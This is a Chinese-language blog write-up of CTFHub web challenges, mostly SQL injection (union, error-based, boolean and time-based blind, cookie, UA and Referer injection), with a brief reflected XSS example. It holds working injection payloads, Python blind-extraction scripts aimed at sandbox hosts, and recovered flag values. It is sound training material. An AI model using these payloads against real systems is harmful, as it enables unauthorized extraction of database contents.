{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"CTFHub技能树之WEB","date":"2020-04-22T06:35:35.000Z","updated":"2020-09-28T14:13:44.000Z","comments":true,"path":"api/articles/CTFHub技能树之WEB.json","keywords":"A1andNS","cover":[],"content":"<p>技能树继续刚。</p>\n<h2 id=\"0x01-整数型注入\"><a href=\"#0x01-整数型注入\" class=\"headerlink\" title=\"0x01 整数型注入\"></a>0x01 整数型注入</h2><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422143849.png\" alt=\"首页\"></p>\n<p>一个SQL整数型注入的大标题，还给出了执行语句是什么。这里我按他的步骤输入了一个1，他进行了<code>select * from news where id=1</code>查询，也给出了ID和Data。</p>\n<p>我现在还是按流程来，判断一下是否存在注入点。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422144126.png\" alt=\"1=2查询失败\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422144213.png\" alt=\"1=1结果\"></p>\n<p>通过and 1=1和and 1=2的对比，可以判断出存在一个数字型注入点。</p>\n<p>通过order by测试，发现列数为2.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422144404.png\" alt=\"列数\"></p>\n<p>查询一下php版本，发现没有显示出来，看来是只会显示第一条信息，所以用limit来解决。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422145816.png\" alt=\"数据库版本查询\"></p>\n<p>这里可以看到用的是MariaDB，从deb可以看出服务器系统是Linux，而且是Debian发行版。</p>\n<p>查询表名：<code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1#</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422145852.png\" alt=\"表名\"></p>\n<p>继续查列名：<code>select * from news where id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422150024.png\" alt=\"列名\"></p>\n<p>下面爆内容：<code>select * from news where id=1 union select 1,group_concat(flag) from flag limit 1,1#</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200422150004.png\" alt=\"flag\"></p>\n<p>得到ctfhub{aeb3b0421660209b86bd97aa9087cd8064506af8}</p>\n<h2 id=\"0x02-字符型注入\"><a href=\"#0x02-字符型注入\" class=\"headerlink\" title=\"0x02 字符型注入\"></a>0x02 字符型注入</h2><p>这里用手工注入了，也可以去跑sqlmap</p>\n<p>这题是字符型注入，通过1=1和1=2就可以判断出注入点</p>\n<p>首先通过检测，发现了列数为2</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505221837.png\" alt=\"首页\"></p>\n<p>先找一下回显点，在2处。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505221922.png\" alt=\"回显点\"></p>\n<p>数据库版本查询：<code>select * from news where id=&#39;1&#39; union select 1,version() limit 1,1#&#39;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505222119.png\" alt=\"数据库\"></p>\n<p>查询表名：<code>select * from news where id=&#39;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1#&#39;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505222257.png\" alt=\"表名\"></p>\n<p>查询列名：<code>select * from news where id=&#39;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#&#39;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505222909.png\" alt=\"列名\"></p>\n<p>拿数据：<code>select * from news where id=&#39;1&#39; union select 1,group_concat(flag) from flag limit 1,1#&#39;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505222945.png\" alt=\"flag\"></p>\n<p>得到ctfhub{66ce657692212317c5f97f29c593f4ceaac1b970}</p>\n<h2 id=\"0x03-报错注入\"><a href=\"#0x03-报错注入\" class=\"headerlink\" title=\"0x03 报错注入\"></a>0x03 报错注入</h2><p>是报错注入，这题比较简单，可以直接跑sqlmap</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224303.png\" alt=\"1\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224320.png\" alt=\"2\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224345.png\" alt=\"3\"></p>\n<p>这样很容易就拿到了flag，但是大多数sql不会这么容易拿到。</p>\n<p>吃了各饭回来继续</p>\n<p>手工注入来一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224442.png\" alt=\"查列数\"></p>\n<p>先爆数据库名看看。</p>\n<p><code>2 union select count(*),concat(floor(rand(0)*2),0x26,database())x from information_schema.tables group by x</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224523.png\" alt=\"查数据库\"></p>\n<p>再爆表名，因为不止有一个表所以就要一个一个爆了。</p>\n<p><code>2 union select count(*),concat(floor(rand(0)*20),0x26,(select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1))x from information_schema.tables group by x</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224642.png\" alt=\"表名\"></p>\n<p>这里第二个就是flag了。</p>\n<p>然后爆列名</p>\n<p>payload:</p>\n<p><code>2 union select count(*),concat(floor(rand(0)*20),0x26,(select column_name from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39; limit 0,1))x from information_schema.columns group by x</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224843.png\" alt=\"列名\"></p>\n<p>然后爆内容</p>\n<p>payload:</p>\n<p><code>2 union select count(*),concat(floor(rand(0)*20),0x26,(select flag from flag limit 0,1))x from information_schema.columns group by x</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200505224914.png\" alt=\"flag\"></p>\n<p>就可以拿到flag</p>\n<h2 id=\"0x04-布尔注入\"><a href=\"#0x04-布尔注入\" class=\"headerlink\" title=\"0x04 布尔注入\"></a>0x04 布尔注入</h2><p>经过测试发现时数字型布尔注入，发现了列数为2</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200507104823.png\" alt=\"1\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200507104924.png\" alt=\"2\"></p>\n<p>发现回显不对头，当查询语句报错时回显error，但是在查询结果为空的时候时回显success。所以and不能用了，要用if。</p>\n<p><strong>if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。</strong></p>\n<p>exp：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='</span>\nname <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        test_url <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> <span class=\"token string\">'if(ascii(substr((select database()),&#123;0&#125;,1))=\"&#123;1&#125;\",1,(select table_name from information_schema.tables))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>test_url<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'query_success'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            name <span class=\"token operator\">=</span> name <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524225025.png\" alt=\"3\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">'http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    name<span class=\"token operator\">=</span><span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token string\">'0123456789zaqwsxedcrfvtgbyhnujmikolp_'</span><span class=\"token punctuation\">:</span>\n            test_url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">'if(substr((select column_name from information_schema.columns where table_name=\\\"flag\\\" limit &#123;0&#125;,1),&#123;1&#125;,1)=\"&#123;2&#125;\",1,(select column_name from information_schema.columns))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#print(test_url)</span>\n            rep<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>test_url<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'query_success'</span> <span class=\"token keyword\">in</span> rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                name<span class=\"token operator\">=</span>name<span class=\"token operator\">+</span>k\n                <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524230519.png\" alt=\"4\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">'http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    name<span class=\"token operator\">=</span><span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token string\">'0123456789zaqwsxedcrfvtgbyhnujmikolp_'</span><span class=\"token punctuation\">:</span>\n            test_url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">'if(substr((select column_name from information_schema.columns where table_name=\"flag\" limit &#123;0&#125;,1),&#123;1&#125;,1)=\"&#123;2&#125;\",1,(select column_name from information_schema.columns))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#print(test_url)</span>\n            rep<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>test_url<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'query_success'</span> <span class=\"token keyword\">in</span> rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                name<span class=\"token operator\">=</span>name<span class=\"token operator\">+</span>k\n                <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524230543.png\" alt=\"6\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">'http://challenge-0b37c0f909b6982c.sandbox.ctfhub.com:10080/?id='</span>\nname<span class=\"token operator\">=</span><span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        test_url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">'if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,1,(select table_name from information_schema.tables))'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n        rep<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>test_url<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'query_success'</span> <span class=\"token keyword\">in</span> rep<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            name<span class=\"token operator\">=</span>name<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524230604.png\" alt=\"7\"></p>\n<p>就得到了flag</p>\n<h2 id=\"0x05-时间盲注\"><a href=\"#0x05-时间盲注\" class=\"headerlink\" title=\"0x05 时间盲注\"></a>0x05 时间盲注</h2><p>时间盲注用脚本来解决吧</p>\n<p><code>if(substr(database(),1,1)=&#39;s&#39;,sleep(1),1)#</code>用它来测试一下，发现执行命令后会有一定时间的等待，确定为时间盲注。</p>\n<p>exp：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#爆表名</span>\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://challenge-cebbd1dbb7f4db93.sandbox.ctfhub.com:10080/?id='</span>\n<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span><span class=\"token number\">126</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            test_url <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> <span class=\"token string\">'if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;,sleep(3),1)'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span>\n             <span class=\"token comment\">#sleep(1)容易造成误判</span>\n            start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>test_url<span class=\"token punctuation\">)</span>\n            end_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            t <span class=\"token operator\">=</span> end_time <span class=\"token operator\">-</span> start_time\n            <span class=\"token keyword\">if</span> t <span class=\"token operator\">></span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n                name <span class=\"token operator\">=</span> name <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#爆列名</span>\n<span class=\"token comment\">#test_url = url+'if(ascii(substr((select column_name from information_schema.columns where table_name='flag' limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;,sleep(1),1)'.format(k,i,j)</span>\n\n<span class=\"token comment\">#爆数据</span>\n<span class=\"token triple-quoted-string string\">'''for k in range(0,10):\n    name = ''\n    for i in range(1,50):\n        print(i)\n        for j in range(48,126):\n            test_url = url+'if(ascii(substr((select flag from flag limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;,sleep(3),1)'.format(k,i,j)\n            #sleep(1)容易造成误判\n            start_time = time.time()\n            r = requests.get(test_url)\n            end_time = time.time()\n            t = end_time - start_time\n            if t > 3:\n                name = name + chr(j)\n                break\n        print(name)\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524230658.png\" alt=\"8\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524230739.png\" alt=\"9\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200524230757.png\" alt=\"10\"></p>\n<p>不知道为什么总会出现这种情况，部分字符出错，整体正确。</p>\n<p>所以就使用了sqlmap来拿flag，还是太菜了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220116.png\" alt=\"11\"></p>\n<p>后来经过我的不断研究和尝试，发现了问题所在，那就是sleep()函数的时间，之前设置的是1秒，容易出现误判，所以我应该吧sleep()时间调长，果然调长后问题就解决了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220359.png\" alt=\"12\"></p>\n<p>nice，圆满解决问题。</p>\n<h2 id=\"0x06-MySQL结构\"><a href=\"#0x06-MySQL结构\" class=\"headerlink\" title=\"0x06 MySQL结构\"></a>0x06 MySQL结构</h2><p>判断出列数为2.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220504.png\" alt=\"1\"></p>\n<p>数据库版本查询。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220534.png\" alt=\"2\"></p>\n<p>表名：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220552.png\" alt=\"3\"></p>\n<p>列名：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220608.png\" alt=\"4\"></p>\n<p>数据：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526220710.png\" alt=\"5\"></p>\n<h2 id=\"0x07-Cookie注入\"><a href=\"#0x07-Cookie注入\" class=\"headerlink\" title=\"0x07 Cookie注入\"></a>0x07 Cookie注入</h2><p>cookie注入，注入点再cookie中id处</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200526222643.png\" alt=\"1\"></p>\n<p>通过测试<code>order by 2</code>,可以判断处列数为2.</p>\n<p>由于它默认显示第一个查询内容，所以id=-1.然后用<code>union+select+1,2</code>判断处显示为再Data位置。</p>\n<p>下面就是常规操作：</p>\n<pre class=\"line-numbers language-markdown\" data-language=\"markdown\"><code class=\"language-markdown\">数据库版本：10.3.22-MariaDB-0+deb10u1\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload：</span><span class=\"token code keyword\">`-1+union+select+1,group_concat(table_name)+from information_schema.tables+where+table_schema=database()`</span>\n表名：sndjdhnevs,news\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload:</span><span class=\"token code keyword\">`-1+union+select+1,group_concat(column_name)+from information_schema.columns+where+table_schema=database()+and+table_name='sndjdhnevs'`</span>\n列名：sgelnaypyg\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload:</span><span class=\"token code keyword\">`-1+union+select+1,group_concat(sgelnaypyg)+from+sndjdhnevs`</span>\nctfhub&#123;4e8cb8e1f1bb8eaf159aa6088b491c6936469259&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"0x08-UA注入\"><a href=\"#0x08-UA注入\" class=\"headerlink\" title=\"0x08 UA注入\"></a>0x08 UA注入</h2><p>注入点就在UA处，只要把UA进行修改就好了。</p>\n<p>经过判断可以知道列数由两列，然后判断处显示位是<code>-1 union select 1,2</code>，显示位再Data位。</p>\n<p>下面就是常规操作：</p>\n<pre class=\"line-numbers language-markdown\" data-language=\"markdown\"><code class=\"language-markdown\">数据库版本：10.3.22-MariaDB-0+deb10u1\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload：</span><span class=\"token code keyword\">`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`</span>\n表名：news,phxqcyyize\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload:</span><span class=\"token code keyword\">`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='phxqcyyize'`</span>\n列名：vymynlhohw\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload:</span><span class=\"token code keyword\">`-1 union select 1,group_concat(vymynlhohw) from phxqcyyize`</span>\nctfhub&#123;39395297888934808939409493a60dfb93010b45&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"0x09-refer注入\"><a href=\"#0x09-refer注入\" class=\"headerlink\" title=\"0x09 refer注入\"></a>0x09 refer注入</h2><p>和前面几题一样只不过是改在referer处注入了。</p>\n<p>一样去判断发现列数为2，然后显示位是Data位。</p>\n<p>下面就是常规操作：</p>\n<pre class=\"line-numbers language-markdown\" data-language=\"markdown\"><code class=\"language-markdown\">数据库版本：10.3.22-MariaDB-0+deb10u1\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload：</span><span class=\"token code keyword\">`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`</span>\n表名：news,zhezriinwe\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload:</span><span class=\"token code keyword\">`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='zhezriinwe'`</span>\n列名：cupxguktzl\n<span class=\"token title important\"><span class=\"token punctuation\">#</span>payload:</span><span class=\"token code keyword\">`-1 union select 1,group_concat(cupxguktzl) from zhezriinwe`</span>\nctfhub&#123;909bee1502e7b3ee0a8f4eb608cd0d86276ccab9&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"0x10-反射型\"><a href=\"#0x10-反射型\" class=\"headerlink\" title=\"0x10 反射型\"></a>0x10 反射型</h2><p>XSS很明显，让<code>name=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/Fscript&gt;</code>可以明显看到弹窗。</p>\n","text":"技能树继续刚。 0x01 整数型注入 一个SQL整数型注入的大标题，还给出了执行语句是什么。这里我按他的步骤输入了一个1，他进行了select * from news where id=1查询，也给出了ID和Data。 我现在还是按流程来，判断一下是否存在注入点。 通过and 1...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"},{"name":"XSS","slug":"XSS","count":4,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x01 整数型注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x02 字符型注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x03 报错注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x04 布尔注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x05-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">0x05 时间盲注</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06-MySQL%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">0x06 MySQL结构</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x07-Cookie%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x07 Cookie注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x08-UA%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x08 UA注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x09-refer%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">0x09 refer注入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x10-%E5%8F%8D%E5%B0%84%E5%9E%8B\"><span class=\"toc-text\">0x10 